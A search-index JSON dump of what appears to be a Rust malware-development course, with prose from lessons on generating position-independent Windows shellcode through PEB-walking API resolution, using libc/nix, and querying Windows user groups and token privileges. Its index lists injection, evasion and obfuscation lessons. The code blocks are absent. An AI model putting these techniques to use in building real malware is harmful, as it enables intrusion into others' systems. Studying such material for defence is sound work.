\"msfvenom\", for example.\nHere we're going to use a technique published by b1tg which consists of two projects, one for compiling a binary and the other for parsing the binary, extracting the \".text\" section which contains the code, then patching the first instructions to force the shellcode to jump directly to the beginning of our code, which is filled in the headers of the PE file.\nHere's the structure of our source code:\n\nThe code that generates the shellcode from the binary is located in \"src/main.rs\", but we won't look at its contents, but you'll find it in the course source files. But how it works is easy to summarize: it will read the \"shellcode.exe\" file generated in the neighboring \"shellcode\" folder, then it will read the \"entry point\" field in the headers of the PE (Portable Executable) file containing the address where our code starts, then it will modify the first instructions of the \".text\" section containing all our code, to insert a \"jmp\" instruction with the value of our entry point.\nInstead, we'll look at the \"shellcode\" folder, which contains the code to generate a valid shellcode, starting with the \"shellcode/.cargo/config.toml\" file:\n\nThis is where we make a number of arrangements to turn the section into a functional shellcode, mainly by adding the \"rdata\" and \"pdata\" sections to the \".text\" section so that all the code is independent (known as PIC for Position Independent Code). The other configurations are specifically designed to remove unnecessary data from the code.\nNext, concerning the source code, the \"shellcode/src/binds.rs\" file contains all the data structures used to interact with the Windows API.\nWe'll now analyze the contents of our program.\nHow to call the Windows API🔗\nTo call the Windows API, we're going to use a technique that could also be used to obfuscate function calls, namely to take advantage of the PEB (for Process Environment Block) that we can retrieve independently from memory.\nThe PEB is a data structure containing a whole range of information about the running process, including executable base addresses, process parameters, environment variables and more.\nWhat interests us in this part of the course is one of the PEB fields called \"Ldr\", which lists the dynamic library instances loaded into memory by the process.\nIn our example, our shellcode will simply execute a shell by creating a new process with the \"cmd.exe\" program.\nProgramming without a standard library🔗\nA Rust program without a library consists of removing all the code contained in the \"std\" library, and replacing it with the \"core\" library, which makes no assumptions about the system it's compiling on.\nAs a result, we lose a large part of the code in our binary, since we lose all abstractions to the operating system. We also lose access to many external libraries that depend on the stand library.\nTo instruct Cargo that we want to program without the standard library, we need to add these lines of code to our program:\n\nThe global macro \"#![no_std]\" tells Cargo to use the \"core\" library instead of \"std\".\nThe macro \"#![no_main]\" tells Cargo not to use the \"main\" function as an entry point for the program, something that was only possible with the standard library.\nNext, we'll have to define our own \"panic_handler\", which defines the behavior when the program panics. In our case, we don't want it to do anything, so we'll let it run in a loop.\nThen we need to define the \"eh_personality\" function, which is executed when our program panics - in our case, we just want it to stop right away.\nThe \"_fltused\" symbol is requested by the Windows MSVC compiler when we use float values, normally handled by the standard library.\nFinally, we need to define our program's entry point, which is a Windows-specific prototype.\nRetrieving the ILL🔗\nTo retrieve the PEB address in a completely autonomous way, we use this function :\n\nThe assembler instruction will retrieve the value in the \"gs\" segment register at offset 0x60 and store it in our \"offset\" variable. This value contains the address of the PEB. The reason we can retrieve it like this is that the PEB is located in another data structure called TEB (for Thread Environment Block), which is stored in the \"gs\" segment register at offset 0x30.\nTo access PEB values, we'll cast the \"peb\" variable into a PEB pointer (structure defined in the \"binds.rs\" file).\nRetrieving a module🔗\nThe following code will be used to retrieve a HANDLE to an instance of a module loaded in memory from its UTF-16 encoded name (which amounts to redeveloping the Windows API GetModuleHandleW function):\n\nHere, we'll analyze the contents of the \"Ldr\" contained in the PEB, then iterate over all the modules loaded in memory, each time comparing the name of the module with our input to see if it's the one we're looking for.\nWhen it's found, we return the address of its instance in memory.\nRetrieving a function🔗\nWe're now going to develop the function that will enable us to retrieve a function's pointer from its symbol name (which amounts to redeveloping the GetProcAddress function of the Windows API):\n\nHere, we have to parse the PE format module in memory, with the aim of iterating over the EXPORT_DIRECTORY, which contains the list of functions exposed by the dynamic library.\nFor each function, we compare its name with the input function, and when we find the name of the function we're looking for, we return its function pointer.\nShellcode program🔗\nFrom the functions developed above we have everything we need to freely call any Windows API function without the need for any Rust dependencies:\n\nWe start by writing the prototypes of the functions we want to use, CreateProcessA to create a process and WaitForSingleObject to wait for the process.\nThen we define our UTF-16 string to retrieve the address of the \"KERNEL32.dll\" module.\nFrom the module loaded in memory, we'll retrieve our two function pointers, which we'll cast using the prototypes defined earlier.\nWe'll then prepare the call to the CreateProcessA function by instantiating the STARTUPINFOA data structure, which allows us to configure the created process, and the PROCESS_INFORMATION data structure, which will contain the pointers to our process.\nWe can then import and call our Windows API functions as if we'd imported them normally.\nCompiling🔗\nTo compile our shellcode, all we need to do is run the \"cargo build --release\" command in the \"shellcode\" directory, then \"cargo run\" in the project root.\nAfter that, we can find our raw shellcode in the following location: \"shellcode\\target\\x86_64-pc-windows-msvc\\release\\shellcode.bin\".\nThen you're free to use your favorite shellcode loader, like the one developed in the previous lesson:\n\nConclusion🔗\nSo now you know how to call the Windows API in a completely dynamic and dependency-free way, and generate shellcode from Rust code.\nThis is a relatively simple implementation, so when you use it to develop more elaborate shellcode, remember to use only libraries that are not dependent on the standard Rust library.\n","id":"http://127.0.0.1:1111/shellcode/generate-shellcode-for-windows/","title":"Generate shellcode for Windows"},"http://127.0.0.1:1111/system/":{"body":"","id":"http://127.0.0.1:1111/system/","title":"System APIs"},"http://127.0.0.1:1111/system/libc-api/":{"body":"Introduction🔗\nLibC🔗\nThe libc crate in Rust simplifies the use of most of the functions available in libc.\nThe main features of this crate are :\n\nDeclaration of data types: The crate defines data types such as c_int, c_char and c_void, which correspond to the int, char and void types respectively. These types are used to simplify the use and calling of functions written in C.\nLibc constants : The crate exposes a large number of constants present in the standard C library, such as error codes (errno) or signal constants. These constants facilitate the use of system APIs.\nLibc functions: libc exposes the most widely used functions of the standard C library, simplifying low-level operations such as file manipulation or process management.\n\nPlease note that not all libc functions are described in the crate, so please consult the documentation.\nUnfortunately, it is not possible to use the functions available in this crate without using unsafe blocks.\nThis crate uses features that can be found in the crate documentation at docs.rs.\nNIX🔗\nThe Nix crate exposes wrappers around the main features of libc to make it safer and easier to use.\nThe crate is divided into features. You can find a list of these features on docs.rs.\nIn this section, we'll look at how to use the two crates through three simple examples.\nUsage🔗\nTo include one of the crates in a project, simply add the crate to the dependencies in the Cargo.toml file, as in the case of the libc crate:\n\nFor this same crate, it is possible to use it without using the standard library (std).\nTo do so, you need to specify the absence of default features (and possibly activate the other features one by one):\n\nRetrieving the user and group with which the program is running🔗\nYou can retrieve the user and group with which the process is running using the geteuid function and the getegid function respectively.\nUsing the libc crate:\n\nFor the Nix crate, the code is virtually the same except for the absence of the unsafe block:\n\nNote that you need to use the user feature to access both functions.\nDisplaying the current directory🔗\nIn this example, we'll see how to retrieve the current directory by specifying the buffer where the string will be stored, passing it by reference.\n\nYou can see that we're using an array with the size libc::PATH_MAX and initialized to 0, just as you'd find in C.\nThe std::ffi::CStr::from_ptr function allows you to convert the string and more securely use the return string as it comes from a function written in C.\nThe version using the Nix crate is considerably simpler:\n\nThe feature required to use the getcwd function is fs.\nTCP socket🔗\nHere's how to create a TCP socket using the libc crate to connect to address 127.0.0.1:12345 (works on x86 or x64 systems):\n\nYou can see that the htons and inet_addr functions are not used when creating the sockaddr_in structure.\nThis is because they are not available in the crate, so you have to use other language functions to achieve the same result.\nHere, we retrieve the IP address required in s_addr by converting the IP address into an IPv4Addr, available in the std::net library, then retrieving the bytes that make it up to form a u32. You can replace the u32::from_le_bytes function with u32::from_be_bytes on big-endian systems like ARM.\nTo get the port in the right format, convert the port number into a u16 in big-endian.\nThe Nix version is much simpler:\n\nAs you can see, no type conversions are required. The use of file descriptors defined in the os module of the standard library clearly shows how the libc fits into the language thanks to Nix, whereas the crate libc simply exposes the functions.\nConclusion\nIn conclusion, the crate libc in Rust is a simple interface to the standard C library. It is particularly useful for low-level operations and interoperability with C code, which is very useful for malware development.\nThe Nix crate is a wrapper around the library, facilitating development in Rust as well as program stability.\nFor detailed information on a libc function, you can consult the man-pages available on any Linux system. They provide detailed documentation of standard library functions.\nTo consult a man-page, use the command man followed by the function name. For example, to obtain information on the malloc function, you can run man malloc in the terminal.\nThere are also many online resources providing man-pages, which can be useful. You can find online versions on sites such as man7.\n","id":"http://127.0.0.1:1111/system/libc-api/","title":"Libc API"},"http://127.0.0.1:1111/system/windows-api/":{"body":"Introduction🔗\nThere are several crates available for interacting with the Windows API.\nThe first is the winapi crate.\nHowever, this crate is deprecated as it has not been updated since November 6, 2021.\nThe second is the windows crate developed by Microsoft, which is divided into 2 main crates:\n\nwindows\nwindows-sys\n\nThe windows-sys crate directly exposes API functions and structs, while the windows crate encompasses the API with an overlay to simplify its use with Rust.\nTo demonstrate the difference, here's a tangible example using the WinSock API:\nIn the windows library ([https://github.com/microsoft/windows-rs/blob/master/crates/libs/windows/src/Windows/Win32/Networking/MAX_PREFERRED_LENGTH WinSock/mod.rs](https://github.com/microsoft/windows-rs/blob/master/crates/libs/windows/src/Windows/Win32/Networking/MAX_PREFERRED_LENGTH WinSock/mod.rs)), line 12062 shows the implementation of the fmt trait for the SOCKET_SECURITY_SETTINGS_IPSEC structure, which is not the case in the windows-sys crate (https://github.com/microsoft/windows-rs/blob/master/crates/libs/sys/src/Windows/Win32/Networking/WinSock/mod.rs##L5294).\nThe link macro is declared in the crates/libs/targets/src/lib.rs file.\nThe argument put forward by Microsoft for the use of the windows-sys crate is compilation time, but as this argument is not important in this course, we will use the windows crate in this section.\nYou can find the crate documentation on this site.\nPreparing the environment🔗\nTo include the crate in a project, add the crate to the dependencies in the cargo.toml file, for example:\n\nHowever, as the Windows API is so extensive in terms of functionality, this crate has many features. You can find them at docs.rs.\nEach feature used in the examples will be indicated.\nExamples🔗\nGet user name and group🔗\nIn this first example, we'll see how to retrieve the user name and group of the user who launched the program.\n\nFunctions used🔗\nIn this example, we use the functions GetUserNameA and NetUserGetLocalGroups.\nThe parameters for the GetUserNameA function are:\n\nlbpbuffer: A pointer to a buffer containing the string representing the user name. The pointer is of type PSTR, which is a type defined in WinAPI, and is a pointer to an ANSI string terminated by a null character ('\\0'). This parameter is similar to a pointer to a C string (a char**). The maximum size of a username is UNLEN, which is 256. As indicated in the documentation, a buffer of size UNLEN+1 can contain any username, the +1 being for the null character.\npcbbuffer: This parameter has a dual function: when passed as a parameter to the function, it contains the size of the buffer that will hold the character string (passed in the lbpbuffer parameter). Once the function has been executed, the variable contains the size of the username plus the null character (the number of characters written in the buffer, in short). This double functionality is indicated in Microsoft documentation by the words [in, out] to the left of the pcbbuffer parameter name.\n\nThis function may fail if the buffer is too small to hold the username, in which case it returns 0 and you need to use the GetLastError function to retrieve the error name. In this program, we have a buffer large enough to hold any user name.\nThe parameters for the NetUserGetLocalGroups function are:\n\nservername: A pointer to a buffer which is a string encoded in UTF-16 indicating the name of the server on which we wish to execute the function. This string must be a constant, but this is not necessary here. The pointer is of type PCWSTR. However, as explained in the documentation, we give a pointer to null using PCWSTR::null() to indicate that we wish to execute the function on the local computer.\nusername: A pointer to a buffer which is a string encoded in UTF-16 indicating the username whose groups we wish to retrieve. As with servername, this parameter is of type PCWSTR.\nlevel: A 32-bit unsigned integer (u32) indicating the level of information to be retrieved. In the context of this function, level 0 is the only level that can be used, indicating that basic information on local groups is required.\nflags: A 32-bit unsigned integer (u32) specifying control flags. In this case, LG_INCLUDE_INDIRECT is often used, indicating that indirect groups (groups to which the user belongs via other groups) should also be included in the result.\nbufptr: A pointer to an uninitialized buffer where groups will be stored. Here the type is *mut *mut u8, which can be seen as a char** in C. Here the result is converted into LOCALGROUP_USERS_INFO_0, which is a list of structures containing the groups. What interests us in these structures is the LUID, which we'll see later.\nprefmaxlen: A 32-bit unsigned integer (u32) specifying the preferred buffer size initialized by the API. If the specified size is too small to receive the information, the function will return ERROR_MORE_DATA, and prefmaxlen will be updated with the required size, which can be handy in some cases. Here we use the constant MAX_PREFERRED_LENGTH, which indicates that we wish to have as much information as possible in the buffer.\nentriesread: A pointer to a 32-bit unsigned integer (*mut u32) which will receive the number of entries read, in this case the number of groups.\ntotalentries: This is a pointer to a 32-bit unsigned integer (*mut u32) which contains the number of entries that could have been returned, in this case we want the totality of information.\n\nThis function can also fail, in which case it returns an error code. It is possible to have this error code as a character string using the FormatMessageA function.\nThis function takes as parameter:\n\ndwflags: bitflags indicating what we wish to display, here thanks to the FORMAT_MESSAGE_FROM_SYSTEM and FORMAT_MESSAGE_IGNORE_INSERTS flags, we retrieve the raw character string from the system.\nlpsource: the message location, not used here.\ndwmessageid: A 32-bit unsigned integer (u32) representing the error identifier whose string representation we wish to retrieve. Here we pass the result of the NetUserGetLocalGroups function.\ndwlanguageid: A 32-bit unsigned integer (u32) representing which language the string will be in. Here we specify 0 for the system language.\nlpbuffer: A pointer to a buffer that will contain the string representing the error. The pointer is of type PSTR.\nnsize: A 32-bit unsigned integer (u32) containing the size of the buffer passed in the lpbuffer argument.\nArguments: List of values used when formatting the message. This can be thought of as the arguments passed to prinln! after the first parameter. Here, we're not doing any formatting, so we don't put anything.\n\nCode explanations🔗\nAs you can see from the above description of the function parameters, the GetUserNameA function returns the username in ANSI, whereas the NetUserGetLocalGroups function requests the username encoded in UTF-16. This encoding difference is addressed by the following code, which adds a null character between each ANSI character in the username:\n\nIn the last part of the program, we have this part displaying the groups as strings:\n\nIn this code, we retrieve the group name using the lgrui0_name attribute, which is of type PWSTR. However, as we're retrieving a pointer to an array, we need to use the offset method to move around the array.\nYou may also note that the NetApiBufferFree function is used to free the pointer to groups. This is necessary, as indicated in the documentation for the bufptr parameter of the NetUserGetLocalGroups function. This requirement marks the use of the C++ language in the API, as it is not present in Rust.\nTo complete this example, and as explained in the previous section, it is necessary to use features.\nThe features used in this program are:\n\nYou can see a certain patern in feature names, for example in the use windows::Win32::NetworkManagement::NetManagement::UNLEN, which is part of the \"Win32_NetworkManagement_NetManagement\" feature.\nRecovering process privileges🔗\nThis second example shows how to recover process privileges.\n\nThe functions🔗\nIn this example, we're using the following functions. The order of the list below is important, as it shows how the program works and how the token is used to retrieve process privileges:\n\nGetCurrentProcess: This function returns a pseudo-handle to the process calling this function (we'll see what a handle is next). This value is the constant -1 converted into a Handle (we advise you not to raw this value for compatibility reasons). As you can see, this value is not the PID of the current process.\nOpenProcessToken: This function retrieves a token from a process via its Handle.\nGetTokenInformation: This function retrieves specific information about a token. In our case, we'll retrieve the privileges associated with the token.\nLookupPrivilegeNameA: This function allows us to convert a privilege in numeric format into a human-readable character string.\n\nThe GetCurrentProcess function has no parameters; it simply returns a pseudo-handle to the calling process.\nThe parameters for the OpenProcessToken function are:\n\nProcessHandle: The handle to the process from which we wish to retrieve a token.\nDesiredAccess: A bitmask indicating which tokens we wish to retrieve, here we indicate only TokenPrivileges.\nTokenHandle: Is a pointer to a handle where the handle to the token will be written (handles are used to point to tokens).\n\nThe parameters for the GetTokenInformation function are:\n\nTokenHandle: This is a handle to the token whose information you wish to retrieve, in this case the token retrieved with the OpenProcessToken function.\nTokenInformationClass: This is a value of the TOKEN_INFORMATION_CLASS enumeration, specifying the type of information you wish to retrieve. Several values are therefore possible, but in our case we use the TokenPrivileges value.\nTokenInformation: A pointer to a buffer that will receive the requested information. It's important to note that the structure and size of this buffer depend on the type of information specified by TokenInformationClass.\nTokenInformationLength: The size, in bytes, of the buffer pointed to by TokenInformation.\nReturnLength: A pointer to a 32-bit unsigned integer (u32) that receives the actual size of the token information. Even if the buffer indicated in the TokenInformation parameter is too small, this value will be filled with the size needed to store the information. We use this feature to dynamically obtain the right size for our buffer. Note that if the buffer is not large enough, the function will return an error.\n\nThe parameters for the GetTokenInformation function are:\n\nlpSystemName: A pointer to a string specifying the name of the system in which to search for the privilege. None can be specified for the local system.\nlpLuid: A pointer to a LUID (Locally Unique Identifier) structure that identifies the privilege whose name you wish to obtain.\nlpName: A pointer to a buffer that will receive the privilege name as a character string. This buffer must be large enough to hold the name.\ncchName: A pointer to a 32-bit unsigned integer (u32) which specifies the size of the input buffer. After the call, this variable contains the number of characters written in the buffer to store the privilege name (hence the reference [in, out] to the left of this parameter name in the documentation).\n\nHandles🔗\nA handle is a reference to a resource in or on the system, such as files, processes, threads, graphical objects or sockets.\nThese handles are used by applications to access and manipulate these resources (as shown in this program).\nIt should be noted that each time a resource is opened or created, the operating system allocates a handle to this resource and returns this identifier to the application. A handle to a resource will therefore be different on every process in the system, and is not a unique identifier.\nCode explanation🔗\nThis program works as follows:\n\nA handle is retrieved from the current program.\nUse the previously retrieved handle to retrieve the token of privileges associated with the process.\nRetrieve the privileges associated with the retrieved token in the form of identifiers (each privilege is therefore an identifier).\nConvert privilege identifiers into human-readable character strings\n\nAs you can see, in this code we make 2 calls to the GetTokenInformation function, the first of which retrieves the size of the token structure in bytes, as this is required to create a buffer of sufficient size.\nTo enable human-readable privileges, we use the LookupPrivilegeNameA function, which converts the privilege number (LUID) into a character string.\nThe features required in this program are:\n\nConclusion🔗\nThe windows-sys crate created by Microsoft makes it much easier to execute Windows API functions. This library provides links to Windows API functions and constants in Rust.\nHowever, a thorough understanding of the official Windows API documentation in C++ is essential to create Rust programs with the windows-sys crate. C++ documentation is necessary to understand the specific details of the functions, data types and structures used in the API. In parallel, it is necessary to consult the equivalents available in the windows-sys crate in the documentation to see any differences and simplifications made by Microsoft.\nIn short, although the windows-sys crate simplifies the process of calling Windows API functions in Rust, a solid reference to the C++ documentation remains indispensable for using the API correctly in Rust.\n","id":"http://127.0.0.1:1111/system/windows-api/","title":"Windows API"}},"docInfo":{"http://127.0.0.1:1111/cargo/":{"body":10,"title":1},"http://127.0.0.1:1111/cargo/cross-compilation/":{"body":368,"title":2},"http://127.0.0.1:1111/cargo/dynamic-library/":{"body":278,"title":2},"http://127.0.0.1:1111/cargo/optimise/":{"body":976,"title":2},"http://127.0.0.1:1111/code_injection/":{"body":0,"title":2},"http://127.0.0.1:1111/code_injection/injection-with-ptrace/":{"body":182,"title":2},"http://127.0.0.1:1111/code_injection/process-hollowing/":{"body":430,"title":2},"http://127.0.0.1:1111/code_injection/remote-threads/":{"body":236,"title":1},"http://127.0.0.1:1111/conclusion/":{"body":259,"title":1},"http://127.0.0.1:1111/crypto/":{"body":37,"title":1},"http://127.0.0.1:1111/crypto/aes/":{"body":248,"title":2},"http://127.0.0.1:1111/crypto/df/":{"body":229,"title":2},"http://127.0.0.1:1111/crypto/intro/":{"body":203,"title":1},"http://127.0.0.1:1111/crypto/rsa/":{"body":469,"title":2},"http://127.0.0.1:1111/crypto/sha256/":{"body":379,"title":1},"http://127.0.0.1:1111/crypto/sockets/":{"body":344,"title":2},"http://127.0.0.1:1111/evasion/":{"body":0,"title":1},"http://127.0.0.1:1111/evasion/anti-debug-with-isdebuggerpresent/":{"body":62,"title":1},"http://127.0.0.1:1111/evasion/anti-debug-with-ptrace/":{"body":142,"title":3},"http://127.0.0.1:1111/evasion/detect-sandbox/":{"body":676,"title":2},"http://127.0.0.1:1111/evasion/direct-syscalls/":{"body":272,"title":2},"http://127.0.0.1:1111/evasion/fileless-execution/":{"body":194,"title":2},"http://127.0.0.1:1111/evasion/hells/":{"body":260,"title":2},"http://127.0.0.1:1111/evasion/hook-detection/":{"body":245,"title":2},"http://127.0.0.1:1111/evasion/patch-etw/":{"body":248,"title":2},"http://127.0.0.1:1111/evasion/query-wmi/":{"body":165,"title":2},"http://127.0.0.1:1111/home/":{"body":562,"title":3},"http://127.0.0.1:1111/obfuscation/":{"body":0,"title":1},"http://127.0.0.1:1111/obfuscation/auto-remove/":{"body":411,"title":2},"http://127.0.0.1:1111/obfuscation/dynamic-imports/":{"body":176,"title":2},"http://127.0.0.1:1111/obfuscation/metamorphism/":{"body":238,"title":1},"http://127.0.0.1:1111/obfuscation/polymorphism/":{"body":273,"title":1},"http://127.0.0.1:1111/obfuscation/strings/":{"body":140,"title":2},"http://127.0.0.1:1111/shellcode/":{"body":0,"title":1},"http://127.0.0.1:1111/shellcode/call-assembly-in-rust/":{"body":557,"title":3},"http://127.0.0.1:1111/shellcode/exec-shellcode-in-local/":{"body":603,"title":4},"http://127.0.0.1:1111/shellcode/generate-shellcode-for-linux/":{"body":160,"title":3},"http://127.0.0.1:1111/shellcode/generate-shellcode-for-windows/":{"body":654,"title":3},"http://127.0.0.1:1111/system/":{"body":0,"title":2},"http://127.0.0.1:1111/system/libc-api/":{"body":433,"title":2},"http://127.0.0.1:1111/system/windows-api/":{"body":1143,"title":2}},"length":41},"lang":"English"}
